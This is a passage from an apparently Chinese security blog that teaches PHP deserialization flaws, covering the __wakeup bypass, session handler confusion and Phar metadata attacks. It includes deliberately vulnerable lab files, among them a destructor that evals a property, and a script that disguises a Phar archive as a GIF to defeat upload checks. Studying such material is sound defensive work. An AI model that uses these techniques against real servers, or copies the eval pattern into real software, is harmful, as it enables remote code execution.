alt="image-20220309085459451"></p><p>在url中也要进行%00的添加，否则利用不成功。</p><p>魔术方法：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220309085817014.png" alt="image-20220309085817014"></p><p>当没有对$_GET或是$_POST传入的数据进行过滤的时候，容易造成攻击。</p><p>特别是利用php的嵌入化特性，可以造成xss攻击。</p><p><strong>这是一个反序列化的漏洞代码</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看见的是，变量$a没有对get方法传入的值进行过滤，一旦传入的值是一个序列化后的特殊构造值，则会产生错误的后果。</p><p>主要是因为在删除对象之前会调用_destruct()，然后进行一个echo，经过字符的传输，会产生一个简易的XSS。</p><p>整个反序列化的流程：</p><p>首先创建一个类，建立一个类对应的对象，这个时候会首先调用_construct()，然后再将对象进行序列化，在进行序列化的时候，会首先调用_sleep()，然后再进行反序列化，然后在进行反序列化的时候，会直接调用_wakeup()这个函数，然后当消灭对象的时候再会调用_destruct()这个方法。</p><p>__sleep()方法不需要接受任何参数，但是需要返回一个数组。在数组中包含需要串行化的属性。没有被包含在数组中的属性将会在串行化的时候被忽略。如果没有在类中声明__sleep()方法，对象中的所有属性都将被串行化（就是相当于是没有做出任何的改变）。</p><p>所返回的数组需要自己进行定义，其中的每一个名字都可以是一个属性，返还这个数组之后，就会自动的只将数组中的属性进行串行化。</p><p>在调用unserialize()函数将对象反串行化的时候，将会自动的调用对象中存在的__wakeup()方法，用来在二进制串重新组成一个对象时，为新对象中的成员属性重新初始化。</p><p>__wakeup()方法将会在使用unserialize()函数的时候被自动调用（这两个魔术方法都是写在对象里面，不是单独写的）</p><p>可以在__wakeup()的内部直接为对象中的属性赋值。</p><h1 id="PHP-7-1-版本："><a href="#PHP-7-1-版本：" class="headerlink" title="PHP 7.1+版本："></a>PHP 7.1+版本：</h1><p>在PHP7.1版本以上，对于序列化中的成员变量类型不敏感，当有对不可见字符串进行过滤的时候，可以将public类型的变量输入，然后进行绕过。</p><h1 id="CVE-2016-7124-wakeup绕过"><a href="#CVE-2016-7124-wakeup绕过" class="headerlink" title="CVE-2016-7124 __wakeup绕过"></a>CVE-2016-7124 __wakeup绕过</h1><p><strong>__wakeup魔法函数简介</strong><br> <code>unserialize()</code>会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源<br> 反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行</p><p><strong>漏洞影响版本：</strong><br> php5 &lt; 5.6.25<br> php7 &lt; 7.0.10</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144234-9c15d5ca-0517-1.png" alt="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png"></p><p>也就是这里的对象成员个数，如果说这里的个数多了，就会直接跳过对于_wakeup()的执行。</p><p>常见于绕过_wakeup()中对于成员属性的再次赋值。</p><h1 id="session反序列化漏洞："><a href="#session反序列化漏洞：" class="headerlink" title="session反序列化漏洞："></a>session反序列化漏洞：</h1><p><code>session</code>英文翻译为”会话”，两个人聊天从开始到结束就构成了一个会话。<code>PHP</code>里的<code>session</code>主要是指客户端浏览器与服务端数据交换的对话，从浏览器打开到关闭，一个最简单的会话周期</p><p>cookie与session的区别：</p><p><a href="https://www.zhihu.com/question/19786827">https://www.zhihu.com/question/19786827</a></p><h2 id="PHP-session工作流程"><a href="#PHP-session工作流程" class="headerlink" title="PHP session工作流程"></a>PHP session工作流程</h2><p>会话的工作流程很简单，当开始一个会话时，<code>PHP</code>会尝试从请求中查找会话 <code>ID</code> （通常通过会话 <code>cookie</code>），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，**<code>PHP</code> 就会自动调用<code>php_session_create_id</code>函数创建一个新的会话**，并且在<code>http response</code>中通过<code>set-cookie</code>头部发送给客户端保存，例如登录如下网页<code>Cokkie、Get、Post</code>都不存在<code>session id</code>，于是就使用了<code>set-cookie</code>头<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png" alt="img"></a>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，<code>php</code>也可以自动将<code>session id</code>添加到<code>url</code>参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项.</p><p>会话开始之后，<code>PHP</code> 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中，如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;ghtwf01&#x27;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//就是判断是否设置了username，如果没有设置的话，就把username这个session变量设置为所需的内容</span></span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144840-76164138-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144840-76164138-0518-1.png" alt="img"></a></p><p>主要的一个重点还是session相较于cookie来说的话，是存储在服务器中的。因此，可以直接通过改写session文件进行多种攻击。</p><h2 id="php-ini配置"><a href="#php-ini配置" class="headerlink" title="php.ini配置"></a>php.ini配置</h2><p><code>php.ini</code>里面有如下六个相对重要的配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path=&quot;&quot;      --设置session的存储位置</span><br><span class="line">session.save_handler=&quot;&quot;   --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line">session.auto_start        --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</span><br><span class="line">session.serialize_handler --定义用来序列化/反序列化的处理器名字，默认使用php  </span><br><span class="line">session.upload_progress.enabled --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="line">session.upload_progress.cleanup --读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</span><br></pre></td></tr></table></figure><p>如<code>phpstudy</code>下上述配置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path = &quot;/tmp&quot;      --所有session文件存储在/tmp目录下</span><br><span class="line">session.save_handler = files    --表明session是以文件的方式来进行存储的</span><br><span class="line">session.auto_start = 0          --表明默认不启动</span><br><span class="line">session.serialize_handler = php --表明session的默认(反)序列化引擎使用的是php(反)序列化引擎</span><br><span class="line">session.upload_progress.enabled on --表明允许上传进度跟踪，并填充$ _SESSION变量</span><br><span class="line">session.upload_progress.cleanup on --表明所有POST数据（即完成上传）后，立即清理进度信息($ _SESSION变量)</span><br></pre></td></tr></table></figure><p>对于session文件来说，文件名的格式都是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_xxxxx</span><br></pre></td></tr></table></figure><p>一般来说是默认使用文件的形式进行存储。</p><p>这种类似的形式，后面部分的填充是自动生成的，也就是session id部分。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144851-7c6e2e6a-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144851-7c6e2e6a-0518-1.png" alt="img"></a></p><p><code>session.serialize_handler</code>，它定义的引擎有三种</p><p>|处理器名称|存储格式|<br><code>|php|  键名 + 竖线 + 经过serialize()函数序列化处理的值|</code><br><code>|php_binary|  键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值|</code><br><code>|php_serialize(php&gt;5.5.4)|经过serialize()函数序列化处理的数组|</code></p><h2 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h2><p>首先来看看<code>session.serialize_handler</code>等于<code>php</code>时候的序列化结果，代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（这里是序列化和反序列化的引擎语言使用PHP)</p><p> 可以直接看见sessionid的，使用f12打开控制台，然后在存储选项可以看见。</p><p>session是<code>$_SESSION[&#39;session&#39;]</code>的键名，在|之后是传入的GET参数，经过序列化之后的值。</p><p>键名 + 竖线 + 经过serialize()函数序列化处理的值</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144905-85162680-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144905-85162680-0518-1.png" alt="img"></a></p><p>图片中键名是session，后面的部分是序列化的值，表示string类型，有7位，内容</p><h2 id="php-binary处理器："><a href="#php-binary处理器：" class="headerlink" title="php_binary处理器："></a>php_binary处理器：</h2><p>再来看看<code>session.serialize_handler</code>等于<code>php_binary</code>时候的序列化结果</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionsessionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 <code>35</code>，<code>35</code> 对应的 <code>ASCII</code> 码为<code>#</code>，所以最终的结果如下</p><p>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144911-888b7d60-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144911-888b7d60-0518-1.png" alt="img"></a></p><p>这部分会在键名前加一个和键名长度相等的ASCII码表示的字符。</p><h2 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h2><p>最后就是<code>session.serialize_handler</code>等于<code>php_serialize</code>时候的序列化结果，代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果如下</p><p>|php_serialize(php&gt;5.5.4)|经过serialize()函数序列化处理的数组|</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144917-8c3357da-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144917-8c3357da-0518-1.png" alt="img"></a></p><p>其中a:1表示$_SESSION中有一个元素，同时在花括号里面的内容是传入的GET的值。</p><h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p><code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 <code>|</code> , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p><p>键名 + 竖线 + 经过serialize()函数序列化处理的值</p><p>|php_serialize(php&gt;5.5.4)|经过serialize()函数序列化处理的数组|</p><p>也就是说，可以通过php_serialize来引入|，然后当php进行解析的时候，就会将其中的|前判断为键名。</p><p><strong>遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。<br>这里可能会有一个小疑问，为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明：</strong></p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/1937992-20200530211048774-1369796877.png" alt="img"></p><p>直接看这个博客：<a href="https://www.cnblogs.com/hello-py/articles/13501786.html">https://www.cnblogs.com/hello-py/articles/13501786.html</a></p><p>简单的总结一下，这里主要是有两个部分的问题：</p><p>1、首先是对于session文件使用了两种不同的处理器来进行存储和读取，一个是php_serialize，这里存储的方式是使用a:1{}这种格式，而另外一个是php处理器，这里使用的是键名|值这种方式。当传入的值经过php_serialize处理器进行存储的时候，可以传入<code>|</code>这个符号，当再次使用php处理器进行读取的时候，会直接将<code>|</code>前面的部分读取为键名，然后将后面的部分读取为内容。</p><p>2、看上面的截图，当上述部分成立了之后，会自动的对值的部分进行反序列化。</p><p>对于是否有session反序列化漏洞，最好可以通过查看phpinfo()配置来进行了解。</p><h1 id="Phar拓展反序列化攻击面："><a href="#Phar拓展反序列化攻击面：" class="headerlink" title="Phar拓展反序列化攻击面："></a>Phar拓展反序列化攻击面：</h1><h2 id="phar文件简介"><a href="#phar文件简介" class="headerlink" title="phar文件简介"></a>phar文件简介</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>一个<code>php</code>应用程序往往是由多个文件构成的，如果能把他们集中为一个文件来分发和运行是很方便的，这样的列子有很多，比如在<code>window</code>操作系统上面的安装程序、一个<code>jquery</code>库等等，为了做到这点<code>php</code>采用了<code>phar</code>文档文件格式，这个概念源自<code>java</code>的<code>jar</code>，但是在设计时主要针对 PHP 的 Web 环境，与 <code>JAR</code> 归档不同的是<code>Phar</code>归档可由 <code>PHP</code> 本身处理，因此不需要使用额外的工具来创建或使用，使用<code>php</code>脚本就能创建或提取它。<code>phar</code>是一个合成词，由<code>PHP</code>和 <code>Archive</code>构成，可以看出它是<code>php</code>归档文件的意思(简单来说<code>phar</code>就是<code>php</code>压缩文档，不经过解压就能被 <code>php</code> 访问并执行)</p><h3 id="phar组成结构"><a href="#phar组成结构" class="headerlink" title="phar组成结构"></a>phar组成结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stub：它是phar的文件标识，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;;</span><br><span class="line">manifest：也就是meta-data，压缩文件的属性等信息，以序列化存储</span><br><span class="line">contents：压缩文件的内容</span><br><span class="line">signature：签名，放在文件末尾</span><br></pre></td></tr></table></figure><p>eg:</p><p><code>php</code>内置了一个<code>Phar</code>类来处理相关操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p><p><strong>php Version&gt;&#x3D;5.3.0</strong></p><p>这里有两个关键点：</p><p>一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者其它文件来绕过一些上传限制；</p><p>二是反序列化，<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化，而这样的文件操作函数有很多</p><h2 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h2><p><code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化</p><p>毕竟通过setmetadata()这个方法传入的是一个对象。</p><p>既然有序列化，自然会有反序列化。</p><p>有序列化数据必然会有反序列化操作，<code>php</code>一大部分的文件系统函数在通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化<br> 在网上扒了一张图<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145239-0436a1c4-0519-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112145239-0436a1c4-0519-1.png" alt="img"></a></p><h3 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h3><p>在前面分析<code>phar</code>的文件结构时可能会注意到，<code>php</code>识别<code>phar</code>文件是通过其文件头的<code>stub</code>，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将<code>phar</code>文件伪装成其他格式的文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>phar文件要能够上传到服务器端。</p><p>如<code>file_exists()</code>，<code>fopen()</code>，<code>file_get_contents()</code>，<code>file()</code>等文件操作的函数</p><p>要有可用的魔术方法作为“跳板”。</p><p>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</p><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload_file.php`，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</span><br><span class="line"> `upload_file.html` 文件上传表单</span><br><span class="line"> `file_un.php` 存在`file_exists()`，并且存在`__destruct()</span><br></pre></td></tr></table></figure><h2 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h2><p>upload_file.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(<span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>upload_file.html</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>file_un.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><p>直接将文件头和文件名改成gif格式的，然后在通过phar:&#x2F;&#x2F;这个伪协议进行访问，就能够造成攻击。</p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF(服务器端请求伪造)漏洞</title>
      <link href="/2022/06/15/SSRF(%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)%E6%BC%8F%E6%B4%9E%EF%BC%9A/"/>
      <url>/2022/06/15/SSRF(%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)%E6%BC%8F%E6%B4%9E%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF-服务器端请求伪造-漏洞-理论部分-："><a href="#SSRF-服务器端请求伪造-漏洞-理论部分-：" class="headerlink" title="SSRF(服务器端请求伪造)漏洞(理论部分)："></a>SSRF(服务器端请求伪造)漏洞(理论部分)：</h1><h2 id="1、概述："><a href="#1、概述：" class="headerlink" title="1、概述："></a>1、概述：</h2><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p><p>是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的<strong>内部系统</strong>。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/20200226013932770.png" alt="在这里插入图片描述"></p><blockquote><p>SSRF和CSRF（Cross-site request forgery）其实是有点相关的，挺有意思，一个是服务器请求伪造，一个是跨站请求伪造。</p></blockquote><h2 id="2、漏洞成因："><a href="#2、漏洞成因：" class="headerlink" title="2、漏洞成因："></a>2、漏洞成因：</h2><p>SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用<strong>存在缺陷的web应用作为代理</strong>攻击远程和本地的服务器。</p><p>（举个例子，博客里的图片引用一般都是通过url的方式来进行引用的，这其实就是请求了别的服务器上存储的图片数据，如果没有对这个数据进行过滤的话，可能就会被造成SSRF攻击）</p><h2 id="3、常见漏洞点："><a href="#3、常见漏洞点：" class="headerlink" title="3、常见漏洞点："></a>3、常见漏洞点：</h2><p><img 